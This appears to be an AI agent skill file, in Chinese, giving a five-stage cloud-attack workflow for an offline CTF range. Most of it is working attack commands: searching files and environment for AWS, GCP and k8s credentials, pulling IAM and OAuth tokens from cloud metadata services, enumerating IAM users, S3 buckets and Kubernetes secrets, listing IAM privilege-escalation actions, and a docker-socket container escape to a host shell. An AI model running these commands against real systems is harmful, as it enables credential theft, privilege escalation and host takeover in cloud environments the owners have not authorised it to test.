---
name: cloud
description: triggers: CLOUD, 云攻击, 云安全, cloud attack, AWS, Azure, GCP, k8s, kubernetes, 容器逃逸, IAM, 云配置审计, serverless, S3
---

# CLOUD 云攻击 — CTF 自动化工作流

**运行环境: 离线靶场，禁止外网。所有工具本地安装。**

## 工具清单

| 工具 | 安装 | 用途 |
|---|---|---|
| Python | `D:/Scoop/apps/python/current/python.exe` | 脚本执行 |
| curl | 系统自带 | HTTP 请求（元数据探测） |
| nmap | `scoop install nmap`（已装） | 端口扫描 |

> 注：aws-cli/az-cli/gcloud/ScoutSuite/prowler/trivy/kubectl 未预装。优先用 curl 元数据探测 + 手工。

## 工作流：五阶段推进

### 阶段 1: 凭据发现 Credential Discovery

```bash
# 1a. 环境变量
set  # Windows
env  # Linux

# 1b. 配置文件搜索
findstr /s /i "AKIA" *.txt *.json *.yaml *.yml *.env 2>nul  # Windows
grep -r "AKIA\|ASIA" --include="*.{txt,json,yaml,yml,env}" . 2>/dev/null  # Linux

# 1c. 常见凭据位置
# AWS: ~/.aws/credentials, ~/.aws/config
# Azure: ~/.azure/
# GCP: ~/.config/gcloud/
# k8s: ~/.kube/config, /var/run/secrets/kubernetes.io/serviceaccount/token

# 1d. 云凭据正则模式
# AWS Access Key: AKIA[0-9A-Z]{16}
# AWS Secret Key: 多种格式
# GCP: AIza[0-9A-Za-z\-_]{35}
# Azure: 多种格式
# Generic API Key: sk-[a-zA-Z0-9]{32,48}
```

### 阶段 2: 元数据服务探测 Metadata

```bash
# 2a. AWS 元数据（最常用）
curl -s http://169.254.169.254/latest/meta-data/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<role_name>
curl -s http://169.254.169.254/latest/user-data/
# AWS IMDSv2
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/

# 2b. GCP 元数据
curl -s http://metadata.google.internal/computeMetadata/v1/ -H "Metadata-Flavor: Google"
curl -s http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/ -H "Metadata-Flavor: Google"
curl -s http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -H "Metadata-Flavor: Google"

# 2c. Azure 元数据
curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# 2d. DigitalOcean / OpenStack / 其他
curl -s http://169.254.169.254/metadata/v1.json
```

### 阶段 3: 云枚举 Enumeration

```bash
# 3a. 如果有 aws cli（极少数情况）
aws sts get-caller-identity
aws iam list-users
aws ec2 describe-instances
aws s3 ls

# 3b. 无 aws cli 时用 curl + STS 凭据
# 获取到的 STS 凭据可直接用 curl 调用 AWS API
# 需要构造 SigV4 签名（较复杂，但可行）

# 3c. 容器环境枚举
docker ps -a 2>/dev/null
docker inspect <container_id> 2>/dev/null
# k8s
kubectl get pods --all-namespaces 2>/dev/null
kubectl get secrets --all-namespaces 2>/dev/null
```

### 阶段 4: IAM 提权与配置审计

```bash
# 4a. 审计 S3 bucket 公开性
# 如果有 aws cli
aws s3api get-bucket-acl --bucket <name>
aws s3api get-bucket-policy --bucket <name>

# 4b. 审计安全组
aws ec2 describe-security-groups --filters Name=ip-permission.cidr,Values=0.0.0.0/0

# 4c. IAM 提权检测
# 列出当前权限
aws iam list-attached-user-policies --user-name <user>
aws iam simulate-principal-policy --policy-source-arn <arn> --action-names <actions>

# 4d. 常见提权向量
# iam:CreateAccessKey
# iam:CreateLoginProfile
# iam:AttachUserPolicy
# lambda:UpdateFunctionCode
# ec2:RunInstances
```

### 阶段 5: 容器与 K8s

```bash
# 5a. 容器枚举
docker ps -a
docker images
docker inspect <container>

# 5b. 容器逃逸检查
# privileged 容器
docker inspect <container> | grep -i privileged
# 挂载 docker socket
docker inspect <container> | grep -i docker.sock
# 如果有 docker socket
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host alpine nsenter -t 1 -m -u -n -i sh

# 5c. k8s SA token 利用
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
# 用 token 调 k8s API
curl -s -k -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
  https://$KUBERNETES_SERVICE_HOST/api/v1/namespaces/default/pods
```

## 元数据探测一键脚本

```bash
# 一次性探测所有云元数据
echo "=== AWS ===" && curl -s --connect-timeout 2 http://169.254.169.254/latest/meta-data/
echo "=== GCP ===" && curl -s --connect-timeout 2 -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/
echo "=== Azure ===" && curl -s --connect-timeout 2 -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
echo "=== DigitalOcean ===" && curl -s --connect-timeout 2 http://169.254.169.254/metadata/v1.json
```

## 判定规则

1. **元数据服务可访问且返回 STS 凭据** → Critical
2. **发现云凭据（AKIA/sk-/AIza）** → Critical
3. **S3 bucket 公开** → 数据泄露，High
4. **容器 privileged + hostPID** → 可逃逸，Critical
5. **k8s SA token 可读** → 集群内横向，High

## 离线环境

- 禁止 web_search/fetch_url
- 无 aws-cli/az-cli/gcloud/ScoutSuite/prowler
- 主要靠 curl 元数据探测 + 手工凭据搜索